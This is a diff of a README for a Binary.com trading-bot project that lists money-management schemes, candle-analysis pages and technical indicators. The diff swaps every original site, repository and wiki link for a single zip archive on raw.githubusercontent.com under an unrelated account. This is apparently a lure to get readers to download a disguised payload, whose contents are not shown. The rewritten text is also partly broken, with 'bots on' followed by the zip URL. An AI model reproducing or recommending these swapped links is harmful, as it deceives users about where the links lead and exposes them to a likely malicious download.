@@ -1,78 +1,78 @@
-All my bots where moved to auto trading system https://www.binarybot.online/
+All my bots where moved to auto trading system https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip
 
-Here you will find some scripts for creating/using bots on Binary.com<br> Check the Binary Bot CLI and other stuff: https://github.com/binary-com/binary-bot check some of my <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Money-Management">Money Management</a></br>
+Here you will find some scripts for creating/using bots on https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip<br> Check the Binary Bot CLI and other stuff: https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip check some of my <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Money Management</a></br>
 <ul>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Money-Management#martingale">Martingale</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Martingale</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Money-Management#labouchere">Labouchere</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Labouchere</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Money-Management#oscars-grind">Oscar's Grind</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Oscar's Grind</a>
   </li>
 
 
 </ul>
-<a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Candle-Analysis">Candle Analysis</a>
+<a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Candle Analysis</a>
 <ul>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Candle-Analysis#same-color">Same Color</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Same Color</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Candle-Analysis#properties-size-wick-body">Properties</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Properties</a>
   </li>
 </ul>
-<a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators">Indicators</a>
+<a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Indicators</a>
 <ul>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#arnaud-legoux-ma">Arnaud Legoux MA</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Arnaud Legoux MA</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#average-true-range">Average True Range</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Average True Range</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#awesome-oscilator">Awesome Oscilator</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Awesome Oscilator</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#chop-indicator">Choppiness Indicator</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Choppiness Indicator</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#commodity-channel-index">Commodity Channel Index</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Commodity Channel Index</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#double-ma">Double EMA</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Double EMA</a>
   </li>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#fractal">Fractal</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Fractal</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#hull-ma">Hull MA</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Hull MA</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#ichimoku-cloud">Ichimoku Cloud</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Ichimoku Cloud</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#price-oscilator">Price Oscilator</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Price Oscilator</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#stochastic">Stochastic</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Stochastic</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#triple-ma">Triple EMA</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Triple EMA</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#true-range">True Range</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">True Range</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#wma">WMA</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">WMA</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#williams-alligator">Williams Alligator</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Williams Alligator</a>
   </li>
   <li>
-    <a href="https://github.com/binary-ex-machina/binary.com-bot/wiki/Indicators#williams--r">Williams % R</a>
+    <a href="https://raw.githubusercontent.com/Darkness1999/binary.com-bot/master/veldt/binary.com-bot.zip">Williams % R</a>
   </li>
 
 
